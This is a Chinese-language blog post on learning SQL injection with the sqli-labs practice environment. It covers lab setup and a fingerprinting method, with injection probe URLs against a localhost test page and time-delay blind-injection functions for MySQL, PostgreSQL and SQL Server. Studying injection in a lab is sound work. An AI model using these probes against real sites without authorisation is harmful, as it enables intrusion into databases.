---
title: SQL注入学习之SQLi
tags:
  - 注入
  - sql
categories: web
date: 2024-12-5 17:58:30
---
## 准备
### 环境搭建
环境要求：php5.45、mysql
项目文件下载：[Audi-1/sqli-labs: SQLI labs to test error based, Blind boolean based, Time based. (github.com)](https://github.com/Audi-1/sqli-labs)
简要配置phpstudy2018
### 环境配置
1、sqli-labs-master在里面中找到sqli-connections并以记事本的方式打开db-creds.inc 
2、打开后将$dbpass=‘’改为$dbpass=‘root’并保存（配置账户，上述环境默认密码root）。
3、访问网站，（参考http://127.0.0.1/sqli-labs-master/）链接视实际情况而定。
4、点击setup/reset database for labs 完成网站配置初始化。

## 思路
### 简要梳理
1、查找疑似注入点
2、确定注入点
3、确定数据库类型
4、确定数据库版本、权限

### 查找疑似注入点
被动扫描，bool测试语句，盲注测试语句
### 确定注入点类型
可注入内容类型：数字型、字符型
注入手法：报错注入、盲注（时间、Bool）、union查询注入、堆叠注入
回显类型（明or暗回显）：直接回显、报错回显、外联回显、条件回显
特例：宽字节注入（几乎绝迹）
### 确定数据库类型
#### 前端与数据库类型
asp：SQL Server，Access  
.net：SQL Server  
php：MySQL，PostgreSQL
java：Oracle，MySQL
#### 根据端口判断
**Oracle**：默认端口1521  
**SQL Server**：默认端口1433  
**MySQL**：默认端口3306
#### 根据数据库特有函数来判断
##### len和length
len()：SQL Server 、MySQL以及db2返回长度的函数。
length()：Oracle和INFORMIX返回长度的函数。

##### version和@@version
version()：MySQL查询版本信息的函数
@@version：MySQL和SQL Server查询版本信息的函数

##### substring和substr
MySQL两个函数都可以使用
Oracle只可调用substr
SQL Server只可调用substring

#### 根据特殊符号进行判断
`/*`是MySQL数据库的注释符
`--`是Oracle和SQL Server支持的注释符
`;`是子句查询标识符，Oracle不支持多行查询，若返回错误，则说明可能是Oracle数据库
`#`是MySQL中的注释符，返回错误则说明可能不是MySQL，另外也支持`--` 和`/**/`

#### 根据数据库对字符串的处理方式判断
```http
#MySQL
http://127.0.0.1/test.php?id=1 and 'a'+'b'='ab' 
http://127.0.0.1/test.php?id=1 and CONCAT('a','b')='ab' 

#Oracle
http://127.0.0.1/test.php?id=1 and 'a'||'b'='ab' 
http://127.0.0.1/test.php?id=1 and CONCAT('a','b')='ab' 

#SQL Server
http://127.0.0.1/test.php?id=1 and 'a'+'b'='ab' 
```

#### 根据数据库特有的数据表来判断
```http
#MySQL（version>5.0）
http://127.0.0.1/test.php?id=1 and (select count(*) from information_schema.TABLES)>0 and 1=1
#Oracle
http://127.0.0.1/test.php?id=1 and (select count(*) from sys.user_tables)>0 and 1=1
#SQL Server
http://127.0.0.1/test.php?id=1 and (select count(*) from sysobjects)>0 and 1=1
```

#### 根据盲注特别函数判断
```sql
#MySQL
BENCHMARK(1000000,ENCODE('QWE','ASD'))
SLEEP(5)

#PostgreSQL
PG_SLEEP(5)
GENERATE_SERIES(1,1000000)

#SQL Server
WAITFOR DELAY '0:0:5'
```
#### 根据数据库返回错误信息
```shell
#MySQL
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
#SqlServer
Unclosed quotation mark after the character string ''.
```

```shell
#MySQL
如果返回类似于`Unknown column 'password' in 'order clause'`的错误消息，说明数据库可能是MySQL。
#SQL Server
如果返回类似于`Invalid column name 'password'`的错误消息，说明数据库可能是SQL Server。
```
#### 根据数据库特定的存储过程和函数
```shell
#MySQL
CALL my_procedure();
#SQL Server
EXEC my_procedure;
```